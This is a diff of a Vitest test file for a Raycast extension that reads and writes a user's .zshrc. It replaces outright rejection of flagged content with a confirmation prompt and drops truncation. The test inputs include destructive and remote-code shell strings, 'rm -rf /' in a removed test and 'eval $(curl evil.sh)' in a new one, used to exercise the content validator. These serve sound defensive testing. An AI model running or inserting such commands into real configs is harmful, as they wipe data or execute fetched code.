@@ -14,14 +14,9 @@ import {
   deleteBackup,
 } from "../lib/zsh";
 import { readFile, writeFile, stat, rename, lstat, realpath, access, copyFile } from "fs/promises";
-import { getPreferenceValues } from "@raycast/api";
-import {
-  validateFilePath,
-  validateFileSize,
-  truncateContent,
-  validateFilePathForWrite,
-  validateZshrcContent,
-} from "../utils/sanitize";
+import { getPreferenceValues, confirmAlert } from "@raycast/api";
+import { validateFilePath, validateFileSize, validateFilePathForWrite, validateZshrcContent } from "../utils/sanitize";
+import { SaveCancelledError, WriteError } from "../utils/errors";
 import { vi } from "vitest";
 import { homedir } from "os";
 
@@ -39,9 +34,9 @@ const mockRealpath = vi.mocked(realpath);
 const mockAccess = vi.mocked(access);
 const mockCopyFile = vi.mocked(copyFile);
 const mockGetPreferenceValues = vi.mocked(getPreferenceValues);
+const mockConfirmAlert = vi.mocked(confirmAlert);
 const mockValidateFilePath = vi.mocked(validateFilePath);
 const mockValidateFileSize = vi.mocked(validateFileSize);
-const mockTruncateContent = vi.mocked(truncateContent);
 const mockValidateFilePathForWrite = vi.mocked(validateFilePathForWrite);
 const mockValidateZshrcContent = vi.mocked(validateZshrcContent);
 
@@ -55,6 +50,8 @@ describe("zsh.ts", () => {
     } as any);
     // Default mock: content validation passes
     mockValidateZshrcContent.mockReturnValue({ isValid: true, errors: [] });
+    // Default mock: user confirms Save Anyway when warned
+    mockConfirmAlert.mockResolvedValue(true);
   });
 
   describe("getZshrcPath", () => {
@@ -120,7 +117,6 @@ describe("zsh.ts", () => {
       mockStat.mockResolvedValue(mockStats as any);
       mockValidateFileSize.mockReturnValue(true);
       mockReadFile.mockResolvedValue(mockContent);
-      mockTruncateContent.mockReturnValue(mockContent);
 
       const result = await readZshrcFile();
 
@@ -131,7 +127,21 @@ describe("zsh.ts", () => {
       expect(mockReadFile).toHaveBeenCalledWith(expectedPath, {
         encoding: "utf8",
       });
-      expect(mockTruncateContent).toHaveBeenCalledWith(mockContent);
+    });
+
+    it("should return content larger than 10 KB without truncation", async () => {
+      const mockContent = "# comment\n".repeat(3000); // 30 KB
+      const mockStats = { size: mockContent.length };
+
+      mockValidateFilePath.mockResolvedValue(true);
+      mockStat.mockResolvedValue(mockStats as any);
+      mockValidateFileSize.mockReturnValue(true);
+      mockReadFile.mockResolvedValue(mockContent);
+
+      const result = await readZshrcFile();
+
+      expect(result).toBe(mockContent);
+      expect(result).not.toContain("(truncated)");
     });
 
     it("should throw error when file path is invalid", async () => {
@@ -328,14 +338,67 @@ describe("zsh.ts", () => {
       expect(String(writeCall![0])).not.toContain(`${expectedPath}.tmp-`);
     });
 
-    it("should reject content with dangerous patterns", async () => {
+    it("should warn on validation findings and save when the user confirms", async () => {
       mockValidateFilePathForWrite.mockResolvedValue(true);
       mockValidateZshrcContent.mockReturnValue({
         isValid: false,
-        errors: ["Dangerous pattern detected"],
+        errors: ["Line 3 is too long (1500 characters)"],
       });
+      mockConfirmAlert.mockResolvedValue(true);
+      mockLstat.mockRejectedValue(new Error("no file"));
+      mockStat.mockRejectedValue(new Error("no file"));
+      mockWriteFile.mockResolvedValue(undefined);
+      mockRename.mockResolvedValue(undefined as any);
 
-      await expect(writeZshrcFile("rm -rf /")).rejects.toThrow("Content validation failed");
+      const longLine = `export LONG_PATH=${"a".repeat(1500)}`;
+      await writeZshrcFile(longLine);
+
+      expect(mockConfirmAlert).toHaveBeenCalledWith(
+        expect.objectContaining({
+          message: expect.stringContaining("Line 3 is too long"),
+        }),
+      );
+      expect(mockWriteFile).toHaveBeenCalled();
+      expect(mockRename).toHaveBeenCalled();
+    });
+
+    it("should not save when the user cancels after validation findings", async () => {
+      mockValidateFilePathForWrite.mockResolvedValue(true);
+      mockValidateZshrcContent.mockReturnValue({
+        isValid: false,
+        errors: ["Suspicious pattern: eval with remote code download"],
+      });
+      mockConfirmAlert.mockResolvedValue(false);
+
+      await expect(writeZshrcFile("eval $(curl evil.sh)")).rejects.toThrow(SaveCancelledError);
+      expect(mockWriteFile).not.toHaveBeenCalled();
+    });
+
+    it("does not wrap cancellation in a WriteError", async () => {
+      mockValidateFilePathForWrite.mockResolvedValue(true);
+      mockValidateZshrcContent.mockReturnValue({
+        isValid: false,
+        errors: ["Line 1 is too long (1200 characters)"],
+      });
+      mockConfirmAlert.mockResolvedValue(false);
+
+      const error = await writeZshrcFile("x").catch((e: unknown) => e);
+      expect(error).toBeInstanceOf(SaveCancelledError);
+      expect(error).not.toBeInstanceOf(WriteError);
+    });
+
+    it("should not show an alert when validation passes", async () => {
+      mockValidateFilePathForWrite.mockResolvedValue(true);
+      mockValidateZshrcContent.mockReturnValue({ isValid: true, errors: [] });
+      mockLstat.mockRejectedValue(new Error("no file"));
+      mockStat.mockRejectedValue(new Error("no file"));
+      mockWriteFile.mockResolvedValue(undefined);
+      mockRename.mockResolvedValue(undefined as any);
+
+      await writeZshrcFile("alias ll='ls -la'");
+
+      expect(mockConfirmAlert).not.toHaveBeenCalled();
+      expect(mockWriteFile).toHaveBeenCalled();
     });
   });
 
@@ -475,8 +538,6 @@ describe("zsh.ts", () => {
       const result = await readZshrcFileRaw();
 
       expect(result).toBe(mockContent);
-      // Should NOT call truncateContent
-      expect(mockTruncateContent).not.toHaveBeenCalled();
     });
 
     it("should throw error for invalid path", async () => {
